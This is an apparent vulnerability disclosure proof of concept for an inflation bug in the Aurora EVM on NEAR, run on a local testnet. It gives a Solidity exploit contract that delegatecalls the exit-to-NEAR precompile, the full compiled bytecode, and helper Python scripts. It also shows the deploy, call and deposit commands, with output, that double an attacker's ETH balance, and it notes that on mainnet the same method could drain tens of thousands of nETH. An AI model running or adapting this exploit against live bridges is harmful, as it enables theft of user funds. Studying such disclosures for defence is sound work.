1. setup the testing environment

Build from the latest git commit 5c8691ea6ea5f1b309ef227f7f5c719ffea45d28 release 2.5.2(2022-03-22)

sha256(mainnet-test.wasm) = 62c8846f4e572d6ba61a6e426c19c8fcc2f84a34706d715bdef931207bd8ec9c

We need to use `mint_account` function to skip bridging ETH from the ethereum, so `mainnet-test.wasm` is used for demo purposes here. This is _NOT_ necessary on the mainnet.

network_id = localnet
helper account = test.near
aurora account = aurora.test.near
attacker account = attacker.test.near

```bash

# prepare aurora account
near delete aurora.test.near test.near
near create-account aurora.test.near --master-account=test.near --initial-balance 1000000

# prepare attacker account
near delete attacker.test.near test.near
near create-account attacker.test.near --master-account=test.near --initial-balance 1000000

# depoly the mainnet-release.wasm, bridge prover is not set here
aurora install --chain 1313161556 --owner aurora.test.near --signer aurora.test.near mainnet-test.wasm
## Receipt: H9YzcA3iwYaMiA2o9kv4uWMABAHLGe7vH7F2LrnQQePp
##    Log [aurora.test.near]: [init contract]

# check aurora version
aurora get-version
## 2.5.2
```

2. simulate the mainnet environment

We are going to deposit 1 ETH to the attacker's account as the initial fund. With feature `integration-test` enabled, we can use `mint_account` to create accounts for tests. It modifies the balance and nonce of arbitrary ethereum addresses inside the aurora evm. This is equivalent to bridging ETH from the ethereum mainnet, though there are still some differences between the testing environment and the mainnet.

Check the ETH in circulation on the mainnet:

```bash
near --node_url https://rpc.mainnet.near.org view aurora ft_total_eth_supply_on_near
## View call: aurora.ft_total_eth_supply_on_near()
## Log [aurora]: Total ETH supply on NEAR: 86200284834361415986816
## '86200284834361415986816'

near --node_url https://rpc.mainnet.near.org view aurora ft_total_eth_supply_on_aurora
## View call: aurora.ft_total_eth_supply_on_aurora()
## Log [aurora]: Total ETH supply on Aurora: 155068738442366327754644
## '155068738442366327754644'

near --node_url https://rpc.mainnet.near.org view aurora ft_balance_of --args '{"account_id": "aurora"}'
## View call: aurora.ft_balance_of({"account_id": "aurora"})
## Log [aurora]: Balance of nETH [aurora]: 71860649156052773284222
## '71860649156052773284222'
```

Just calling `mint_account` only increases the ETH supply on NEAR. It does not affect the other two metrics. The nETH balance of `aurora` is 0 since nobody has deposited ETH into the evm by `ft_transfer_call`. It does not change the fact that arbitrary money can be printed, but it slows down the exploiting process heavily in the testing environment, where the printing speed is linear to the initial fund since it's the only _REAL ETH_ in circulation. On the mainnet, the inflation speed is exponential as long as the full 71k nETH of `aurora` is not drained.

python scripts are provided to build the `mint_account` command:

```python3 mint_account.py
#!/usr/bin/python3
import sys, base64, struct
address, nonce, balance = sys.argv[1:4]
account = sys.argv[4] if len(sys.argv) > 4 else 'test.near'
args = base64.b64encode(bytes.fromhex(address) + struct.pack('<QQ', int(nonce), int(balance)))
cmd = "near call aurora.test.near mint_account --base64 --args '%s' --accountId %s --gas 100000000000000" % (args.decode('utf-8'), account)
print(cmd)
```

```bash
# check the ethereum address of `attacker.test.near`
aurora encode-address attacker.test.near
## ┌────────────────────┬────────────────────────────────────────────┐
## │            account │                                    encoded │
## ├────────────────────┼────────────────────────────────────────────┤
## │ attacker.test.near │ 0x32725A659192bAD4092793969fE3394Db8479E8D │
## └────────────────────┴────────────────────────────────────────────┘

# mint 1 ETH to the attacker
python3 mint_account.py 32725A659192bAD4092793969fE3394Db8479E8D 0 1000000000000000000
near call aurora.test.near mint_account --base64 --args 'MnJaZZGSutQJJ5OWn+M5TbhHno0AAAAAAAAAAAAAZKeztuAN' --accountId test.near --gas 100000000000000
## Scheduling a call: aurora.test.near.mint_account(MnJaZZGSutQJJ5OWn+M5TbhHno0AAAAAAAAAAAAAZKeztuAN)
## Doing account.functionCall()
##
## Receipts: HFGtEuJkARPnGzNR1SG3ous3Hh4ERsr34CFCdP3UhWeX, 5DbRPeuooJF1SMyKFgp6PyuAy95GrCDPN52zSz4r4Nwu, 9ehjG7QwqiUbrpodvitvPyyin1QBg3Vj1BqjQFUwbmqg
##     Log [aurora.test.near]: total_writes_count 2
##     Log [aurora.test.near]: total_written_bytes 64
## Receipt: EuNYaQPrDPKFmdKG7a4EevQGWeuFWGdzDY62tR2KDbdb
##     Log [aurora.test.near]: Call from verify_log_entry
## Receipt: 34GhKfvgT2Kb5FvtRYppyvgiawMsZetdbNpyBzWZQc96
##     Log [aurora.test.near]: Finish deposit with the amount: 1000000000000000000
##     Log [aurora.test.near]: Mint 1000000000000000000 nETH tokens for: aurora.test.near
##     Log [aurora.test.near]: Mint 0 nETH tokens for: aurora.test.near
##     Log [aurora.test.near]: Record proof:
## Transaction Id 5C8AK25G7Q4j5ygnLUKaXKZTWCHYarBhXH5D1X98Xg9U
## To see the transaction in the transaction explorer, please open this url in your browser
## http://127.0.0.1:49169/transactions/5C8AK25G7Q4j5ygnLUKaXKZTWCHYarBhXH5D1X98Xg9U
## ''

# check balance: 1 ETH is mint for aurora.test.near, it increases the balance of the attacker's ethereum address.
near view aurora.test.near ft_balance_of --args '{"account_id": "aurora.test.near"}'
## View call: aurora.test.near.ft_balance_of({"account_id": "aurora.test.near"})
## Log [aurora.test.near]: Balance of nETH [aurora.test.near]: 1000000000000000000
## '1000000000000000000'

aurora get-balance 0x32725A659192bAD4092793969fE3394Db8479E8D
## ┌────────────────────────────────────────────┬─────────────────────┐
## │                                    address │             balance │
## ├────────────────────────────────────────────┼─────────────────────┤
## │ 0x32725A659192bAD4092793969fE3394Db8479E8D │ 1000000000000000000 │
## └────────────────────────────────────────────┴─────────────────────┘

# check supply
near view aurora.test.near ft_total_eth_supply_on_aurora
## View call: aurora.test.near.ft_total_eth_supply_on_aurora()
## Log [aurora.test.near]: Total ETH supply on Aurora: 0
## '0'

near view aurora.test.near ft_total_eth_supply_on_near
## View call: aurora.test.near.ft_total_eth_supply_on_near()
## Log [aurora.test.near]: Total ETH supply on NEAR: 1000000000000000000
## '1000000000000000000'

```

3. print money from the air

The following instructions do not rely on any privilege, all transactions are sent from attacker.test.near .

We need to trigger the bug in the EVM context. The exploit is written in a few lines of solidity.

```solidity Exploit.sol
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Exploit {
    address payable private owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit(bytes memory recipient) public payable {
        require(msg.sender == owner);

        bytes memory input = abi.encodePacked("\x00", recipient);
        uint input_size = 1 + recipient.length;

        assembly {
            let res := delegatecall(gas(), 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)
        }

        owner.transfer(msg.value);
    }
}
```

The compiled bytecode is 608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610495806100606000396000f3fe60806040526004361061001e5760003560e01c806353a2d9cb14610023575b600080fd5b61003d600480360381019061003891906101ca565b61003f565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461009757600080fd5b6000816040516020016100aa9190610267565b60405160208183030381529060405290506000825160016100cb9190610300565b905060206000826020850173e9217bc70b7ed1f598ddd3199e80b093fa71124f5af45060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f19350505050158015610154573d6000803e3d6000fd5b50505050565b600061016d610168846102ae565b610289565b90508281526020810184848401111561018957610188610436565b5b610194848285610360565b509392505050565b600082601f8301126101b1576101b0610431565b5b81356101c184826020860161015a565b91505092915050565b6000602082840312156101e0576101df610440565b5b600082013567ffffffffffffffff8111156101fe576101fd61043b565b5b61020a8482850161019c565b91505092915050565b600061021e826102df565b61022881856102ea565b935061023881856020860161036f565b80840191505092915050565b60006102516001836102f5565b915061025c82610456565b600182019050919050565b600061027282610244565b915061027e8284610213565b915081905092915050565b60006102936102a4565b905061029f82826103a2565b919050565b6000604051905090565b600067ffffffffffffffff8211156102c9576102c8610402565b5b6102d282610445565b9050602081019050919050565b600081519050919050565b600081905092915050565b600081905092915050565b600061030b82610356565b915061031683610356565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561034b5761034a6103d3565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b8381101561038d578082015181840152602081019050610372565b8381111561039c576000848401525b50505050565b6103ab82610445565b810181811067ffffffffffffffff821117156103ca576103c9610402565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b6000808201525056fea2646970667358221220f88ffdad34a26d5f9d1945ec7272e4c7cceb941058db55b5e20adfeb72dd050664736f6c63430008070033

```bash
# deploy by attacker.test.near
aurora --signer attacker.test.near deploy-code 0x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610495806100606000396000f3fe60806040526004361061001e5760003560e01c806353a2d9cb14610023575b600080fd5b61003d600480360381019061003891906101ca565b61003f565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461009757600080fd5b6000816040516020016100aa9190610267565b60405160208183030381529060405290506000825160016100cb9190610300565b905060206000826020850173e9217bc70b7ed1f598ddd3199e80b093fa71124f5af45060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f19350505050158015610154573d6000803e3d6000fd5b50505050565b600061016d610168846102ae565b610289565b90508281526020810184848401111561018957610188610436565b5b610194848285610360565b509392505050565b600082601f8301126101b1576101b0610431565b5b81356101c184826020860161015a565b91505092915050565b6000602082840312156101e0576101df610440565b5b600082013567ffffffffffffffff8111156101fe576101fd61043b565b5b61020a8482850161019c565b91505092915050565b600061021e826102df565b61022881856102ea565b935061023881856020860161036f565b80840191505092915050565b60006102516001836102f5565b915061025c82610456565b600182019050919050565b600061027282610244565b915061027e8284610213565b915081905092915050565b60006102936102a4565b905061029f82826103a2565b919050565b6000604051905090565b600067ffffffffffffffff8211156102c9576102c8610402565b5b6102d282610445565b9050602081019050919050565b600081519050919050565b600081905092915050565b600081905092915050565b600061030b82610356565b915061031683610356565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561034b5761034a6103d3565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b8381101561038d578082015181840152602081019050610372565b8381111561039c576000848401525b50505050565b6103ab82610445565b810181811067ffffffffffffffff821117156103ca576103c9610402565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b6000808201525056fea2646970667358221220f88ffdad34a26d5f9d1945ec7272e4c7cceb941058db55b5e20adfeb72dd050664736f6c63430008070033
## Receipt: 5TXCcniUVEKsk9kGSK6ARRAb7qepFewx2PjdUqFihagW
##     Log [aurora.test.near]: code_write_at_address Address(0x3fb037e856cb227749b9de541d9f10966901389e) 1070
##     Log [aurora.test.near]: total_writes_count 6
##     Log [aurora.test.near]: total_written_bytes 1230
## (node:85056) UnhandledPromiseRejectionWarning: Error: Reached the end of buffer when deserializing: output.output

# the output is incomplete, but it doesn't matter, we know the contract address is 0x3fb037e856cb227749b9de541d9f10966901389e

# call exploit('attacker.test.near')
python3 call.py 3fb037e856cb227749b9de541d9f10966901389e 1000000000000000000 53a2d9cb0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001261747461636b65722e746573742e6e6561720000000000000000000000000000
near call aurora.test.near call --base64 --args 'AD+wN+hWyyJ3SbneVB2fEJZpATieAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADeC2s6dkAABkAAAAU6LZywAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJhdHRhY2tlci50ZXN0Lm5lYXIAAAAAAAAAAAAAAAAAAA==' --accountId attacker.test.near --gas 300000000000000

## Doing account.functionCall()
## Receipts: FJ9STC1BqCuHMSNUrQhXfKEgMGQqcUFK9St7kmfMUKJf, 9YQn8Eg6tefjEMa8DFF2ADubFhmZpeFLUTtdgfe5s17m
##     Log [aurora.test.near]: call_contract aurora.test.near.ft_transfer
##     Log [aurora.test.near]: total_writes_count 4
##     Log [aurora.test.near]: total_written_bytes 128
## Receipt: CuzbfS4ZhaHGexzw7cgD1Xf6WWzo5MQfV7S5N3tvz2VP
##     Log [aurora.test.near]: Transfer 1000000000000000000 from aurora.test.near to attacker.test.near
##     Log [aurora.test.near]: Transfer amount 1000000000000000000 to attacker.test.near success with memo: None
## Transaction Id 2Zpm9r4ayyCPJtQ56uwGJFvc2d9xkEAWm6F2Zy5BhzDJ
## To see the transaction in the transaction explorer, please open this url in your browser
## http://127.0.0.1:49169/transactions/2Zpm9r4ayyCPJtQ56uwGJFvc2d9xkEAWm6F2Zy5BhzDJ
## `\x07\x00\x00\x00\x00\x00}d\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00�!{�\x0B~�����\x19�����q\x12O\x04\x00\x00\x00Z����\x19�g=��"m�����?E�(��\x14\x03�9/m��\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x002rZe����\t'����9M�G��\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00�M��\x12����7\x14��b��q��\x17\x17h6��\x14ԟ�LF\x05 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\rඳ�d\x00\x00`
##

# check balance again, attacker's ETH on AURORA EVM is unchanged, but the same amount of nETH is sent to the attacker on NEAR
aurora get-balance 0x32725A659192bAD4092793969fE3394Db8479E8D
## ┌────────────────────────────────────────────┬─────────────────────┐
## │                                    address │             balance │
## ├────────────────────────────────────────────┼─────────────────────┤
## │ 0x32725A659192bAD4092793969fE3394Db8479E8D │ 1000000000000000000 │
## └────────────────────────────────────────────┴─────────────────────┘

near view aurora.test.near ft_balance_of --args '{"account_id": "attacker.test.near"}'
## View call: aurora.test.near.ft_balance_of({"account_id": "attacker.test.near"})
## Log [aurora.test.near]: Balance of nETH [attacker.test.near]: 1000000000000000000
## '1000000000000000000'
```

```python3 ft_transfer_call.py
#!/usr/bin/python3
import sys, base64, struct, json
address, amount = sys.argv[1:3]
account = 'attacker.test.near'
receiver = 'aurora.test.near'
relayer = 'attacker.test.near'
fee = '0' * 64
msg = '%s:%s%s' % (relayer, fee, address)
args = base64.b64encode(json.dumps({
    'receiver_id': receiver,
    'amount': amount,
    'memo': '',
    'msg': msg
}).encode('utf-8'))
cmd = "near call aurora.test.near ft_transfer_call --base64 --args '%s' --accountId %s --gas 300000000000000 --depositYocto 1" % (args.decode('utf-8'), account)
print(cmd)
```

```bash
# deposit ETH from NEAR to AURORA
python3 ft_transfer_call.py 32725A659192bAD4092793969fE3394Db8479E8D 1000000000000000000
near call aurora.test.near ft_transfer_call --base64 --args 'eyJyZWNlaXZlcl9pZCI6ICJhdXJvcmEudGVzdC5uZWFyIiwgImFtb3VudCI6ICIxMDAwMDAwMDAwMDAwMDAwMDAwIiwgIm1lbW8iOiAiIiwgIm1zZyI6ICJhdHRhY2tlci50ZXN0Lm5lYXI6MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDMyNzI1QTY1OTE5MmJBRDQwOTI3OTM5NjlmRTMzOTREYjg0NzlFOEQifQ==' --accountId attacker.test.near --gas 300000000000000 --depositYocto 1
## Scheduling a call: aurora.test.near.ft_transfer_call(eyJyZWNlaXZlcl9pZCI6ICJhdXJvcmEudGVzdC5uZWFyIiwgImFtb3VudCI6ICIxMDAwMDAwMDAwMDAwMDAwMDAwIiwgIm1lbW8iOiAiIiwgIm1zZyI6ICJhdHRhY2tlci50ZXN0Lm5lYXI6MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDMyNzI1QTY1OTE5MmJBRDQwOTI3OTM5NjlmRTMzOTREYjg0NzlFOEQifQ==) with attached 0.000000000000000000000001 NEAR
## Doing account.functionCall()
## Receipts: 9nbvU2oUQdERNEGUFSkGKoEtvsZ9fQ7QuRizHHAU3uTi, FFpQMbBpXKQUJ6M1EaXyTzFNWzB65wxeRYhwtbN4gcKD, 26Sbw3NUmgrKLovnZj4PkAnqVTbgEgcVMkMd9MyYo8Lr
##     Log [aurora.test.near]: Transfer call to aurora.test.near amount 1000000000000000000
##     Log [aurora.test.near]: Transfer 1000000000000000000 from attacker.test.near to aurora.test.near
##     Log [aurora.test.near]: Memo:
## Receipt: 6x4xhvzoMEVCjE4oJb3PT2mcZWq9gFGVEESnW9M1wQYf
##     Log [aurora.test.near]: Call ft_on_transfer
##     Log [aurora.test.near]: Mint 1000000000000000000 ETH tokens for: 32725a659192bad4092793969fe3394db8479e8d
## Receipt: DKP1FupyDHjmyJVHzNYE7v599i25NzZyBFE7UKHednwQ
##     Log [aurora.test.near]: Resolve transfer from attacker.test.near to aurora.test.near success
## Transaction Id 3XQwXvX6juUTRX8w6A4ybU36ZgCGPAfkXFMxNAi5yS7u
## To see the transaction in the transaction explorer, please open this url in your browser
## http://127.0.0.1:49169/transactions/3XQwXvX6juUTRX8w6A4ybU36ZgCGPAfkXFMxNAi5yS7u
## '1000000000000000000'

# now we have doubled the balance!
aurora get-balance 0x32725A659192bAD4092793969fE3394Db8479E8D
## ┌────────────────────────────────────────────┬─────────────────────┐
## │                                    address │             balance │
## ├────────────────────────────────────────────┼─────────────────────┤
## │ 0x32725A659192bAD4092793969fE3394Db8479E8D │ 2000000000000000000 │
## └────────────────────────────────────────────┴─────────────────────┘

# check supply again, ETH on AURORA is inflated
near view aurora.test.near ft_total_eth_supply_on_near
## View call: aurora.test.near.ft_total_eth_supply_on_near()
## Log [aurora.test.near]: Total ETH supply on NEAR: 1000000000000000000
## '1000000000000000000'
near view aurora.test.near ft_total_eth_supply_on_aurora
## View call: aurora.test.near.ft_total_eth_supply_on_aurora()
## Log [aurora.test.near]: Total ETH supply on Aurora: 1000000000000000000
## '1000000000000000000'
```



